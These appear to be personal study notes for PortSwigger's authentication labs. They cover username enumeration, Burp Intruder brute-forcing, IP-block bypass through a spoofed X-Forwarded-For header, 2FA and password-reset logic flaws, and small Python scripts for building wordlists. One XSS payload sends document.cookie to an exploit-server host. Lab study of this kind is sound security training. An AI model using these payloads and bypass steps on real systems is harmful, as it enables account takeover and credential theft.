## General info
- [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

## LABS payloads
- send login request to intruder -> correct grep match for Invalid user and Invalid password -> brute users -> brute
  passwords (302 is the target)
- find that you receive "Invalid username or password." -> brute users and find resonse that is different that that 
  error string -> brute password and take 302 response
- bypass IP block: pitchfork attack -> position 1 - X-Forward-For header with IP 129.0.0.§1§ from 1 to 255 -> 
  payload 2 - usernames list -> for password use very long password -> the response with the highest response time 
  is the one you need -> repeat same attack with password list

#### Broken brute-force protection, IP block
- notice that every successfull attempt reset number of incorrect logins
- so you need to brute passwords and every second attempt make login to wiener
  - use python script to sort usernames
  - use script to sort passwords (every second is correct password for wiener)
  - brute it
    ```
    with open('./passwords.txt', 'r') as f:
        for pswd in f.readlines():
            pswds.append(pswd.strip())
            pswds.append('peter')
    
    for i in range(101):
        print('carlos')
        print('wiener')
    ```
- from their solution one useful hint:
  - add the attack to a resource pool with Maximum concurrent requests set to 1

#### Username enumeration via account lock
- enumeration of users - make passwords be at 1st position
  - password=§peter§&username=§wiener§
  - payload for passwords 1,2,3,4
  - payload for users = userlists
  - find response with "You have made too many incorrect login attempts. Please try again in 1 minute(s)."
- brute passwords:
  - use identified user name
  - reduce parrallel requests
  - add 1 min between requests
  - cluster bomb attack
    - payload 1 - numbers 1, 2, 3, 4
    - paylodd 2 - password list
  - find response with 302 code

#### Broken brute-force protection, multiple credentials per request
- find login.js in target tab
- notice that it parses json data and sends it to backend
- using script create a list of passwords separated by comma
```
for pswd in lst:
	print(f'\"{pswd}\"', end=',')
```
- find login request and paste in the password field array with prepared list
- send

#### 2FA simple bypass
```
log in using login and password
find /login2 request
send it to repeater the send to / then to account
or
when promted for verification code manually change url to /my-account
```

#### 2FA broken logic
```
here is the idea: brute all mfa-codes. but community edition of burp takes to long to brute.
```

#### Brute-forcing a stay-logged-in cookie
- find that stay logged in cookie is a string of login with password hashed with md5, and all encoded in base64 
  wiener: md5-hash-of-password
- create brute force attack:
  - paste passwords, then hash them, then add prefix, then encode in base64 
  - find response with 200

#### Offline password cracking
- find xss in comment field
```html
<script>document.location='https://exploit-...exploit-server.net/exploit?c='+document.cookie</script>
```
- find that stay logged in cookie is login:hashed-password in base64 in log of exploit:
  - ip ... 
    secret=value;%20stay-logged-in=login:hashed-password in base64
- brute it, using online md5 cracking tool - https://md5decrypt.net/en/

#### Password reset broken logic
- use forgot password
- examine link
- intercept request /forgot-passord?… and change name to carlos
- login as carlos

#### Password brute-force via password change
- intercept request for password changing 
- change name to carlos 
- there are 3 fields 
- brute current password filling new and repeat-new fields with different passwords 
- find response with "New passwords do not match"